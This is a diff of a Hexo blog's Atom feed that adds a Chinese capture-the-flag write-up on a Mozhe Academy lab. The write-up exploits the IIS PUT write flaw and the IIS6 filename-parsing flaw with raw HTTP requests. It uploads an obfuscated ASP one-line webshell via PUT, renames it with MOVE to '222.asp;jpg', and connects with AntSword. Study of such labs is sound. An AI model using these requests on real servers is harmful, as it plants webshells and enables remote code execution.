@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://tea9.xyz/"/>
-  <updated>2021-07-02T02:36:19.570Z</updated>
+  <updated>2021-05-10T01:54:08.991Z</updated>
   <id>http://tea9.xyz/</id>
   
   <author>
@@ -15,24 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>xxe</title>
-    <link href="http://tea9.xyz/post/2141030099.html"/>
-    <id>http://tea9.xyz/post/2141030099.html</id>
-    <published>2021-06-29T02:48:10.000Z</published>
-    <updated>2021-07-02T02:36:19.570Z</updated>
-    
-    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">您好，这里需要密码。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e78bf3b89a60bb3e72f66d905dd6688d49cecfefe3fbcaa1da21d3475dfe1308">73c8e43c92e1fe46ce6384f081f07ff0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-    
-    <summary type="html">
-    
-      这里有东西被加密了，需要输入密码查看哦。
-    
-    </summary>
-    
-    
-  </entry>
   
   <entry>
     <title>微信小程序抓包</title>
@@ -505,6 +487,34 @@
     
     
       <category term="book" scheme="http://tea9.xyz/tag/book/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>题目2-IIS写权限漏洞分析溯源</title>
+    <link href="http://tea9.xyz/post/3128432425.html"/>
+    <id>http://tea9.xyz/post/3128432425.html</id>
+    <published>2020-10-19T07:48:29.000Z</published>
+    <updated>2020-11-07T04:49:50.423Z</updated>
+    
+    <content type="html"><![CDATA[<p>墨者学院一道题目-IIS写权限漏洞分析溯源<br><a href="https://www.mozhe.cn/bug/detail/VnRjUTVETHFXWk5URWNjV2VpVWhRQT09bW96aGUmozhe?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">题目链接</a>    </p><p>知识点：<br>1.<a href="https://www.cnblogs.com/tdcqma/p/6125789.html" target="_blank" rel="noopener">iis put写权限漏洞</a><br>2.<a href="https://www.cnblogs.com/hack747/p/12271048.html" target="_blank" rel="noopener">iis6文件名解析漏洞</a>   </p><p>工具：<br>burpsuite<br><a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">Antsword</a><a href="https://github.com/AntSwordProject/AntSword-Loader" target="_blank" rel="noopener">AntSword-Loader</a>    </p><hr><p>IP地址 : 219.153.49.228 端口 : 48336 协议 : http 其他 : [点击访问]  </p><p>1.直接访问靶场，并使用burpsuite抓包<br><a href="http://219.153.49.228:48336" target="_blank" rel="noopener">http://219.153.49.228:48336</a><br>显示页面：<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/36/02.png" alt=""><br>原始包：<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/36/01.png" alt=""></p><p>2.利用iis写权限漏洞 使用PUT上传文件txt<br>用OPTIONS，观察返回，Allow存在PUT<br>请求包：  </p><pre><code>OPTIONS / HTTP/1.1Host: 219.153.49.228:48336User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheOPTIONS</code></pre><p>响应包：  </p><pre><code>HTTP/1.1 200 OKConnection: closeDate: Mon, 19 Oct 2020 07:41:00 GMTServer: Microsoft-IIS/6.0MS-Author-Via: DAVContent-Length: 0Accept-Ranges: noneDASL: &lt;DAV:sql&gt;DAV: 1, 2Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCHAllow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCKCache-Control: private</code></pre><p>利用iisput写权限漏洞</p><pre><code>PUT /a.txt HTTP/1.1Host: 219.153.49.228:48336User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeContent-Length: 24&lt;%exECuTe ReqUEst(0)%&gt;</code></pre><pre><code>HTTP/1.1 201 CreatedConnection: closeDate: Mon, 19 Oct 2020 07:35:54 GMTServer: Microsoft-IIS/6.0Location: http://219.153.49.228/a.txtContent-Length: 0Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK</code></pre><p>成功写入  </p><p>3.MOVE修改文件名（利用iis解析漏洞）</p><p>Destination:/222.asp;jpg  </p><pre><code>MOVE /a.txt HTTP/1.1Host: 219.153.49.228:48336Destination:/222.asp;jpgUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeContent-Length: 2</code></pre><pre><code>HTTP/1.1 207 Multi-StatusConnection: closeDate: Mon, 19 Oct 2020 07:37:17 GMTServer: Microsoft-IIS/6.0Location: http://219.153.49.228/222.asp;jpgContent-Type: text/xmlContent-Length: 182&lt;?xml version=&quot;1.0&quot;?&gt;&lt;a:multistatus xmlns:a=&quot;DAV:&quot;&gt;&lt;a:response&gt;&lt;a:href&gt;http://219.153.49.228/a.txt&lt;/a:href&gt;&lt;a:status&gt;HTTP/1.1 401 Unauthorized&lt;/a:status&gt;&lt;/a:response&gt;&lt;/a:multistatus&gt;</code></pre><p>4.使用Antsword链接<br><a href="http://219.153.49.228:48336/222.asp;jpg" target="_blank" rel="noopener">http://219.153.49.228:48336/222.asp;jpg</a><br>0<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/36/03.png" alt=""><br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/36/04.png" alt=""><br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/36/05.png" alt=""></p><pre><code>/* mozhe4a24a1cb68810f620c473728805*/ </code></pre>]]></content>
+    
+    <summary type="html">
+    
+      iis put写权限漏洞、iis6文件名解析漏洞
+    
+    </summary>
+    
+      <category term="安全" scheme="http://tea9.xyz/category/%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="安全题目" scheme="http://tea9.xyz/category/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E9%A2%98%E7%9B%AE/"/>
+    
+    
+      <category term="题目" scheme="http://tea9.xyz/tag/%E9%A2%98%E7%9B%AE/"/>
+    
+      <category term="墨者学院" scheme="http://tea9.xyz/tag/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
+    
+      <category term="iis" scheme="http://tea9.xyz/tag/iis/"/>
     
   </entry>
   
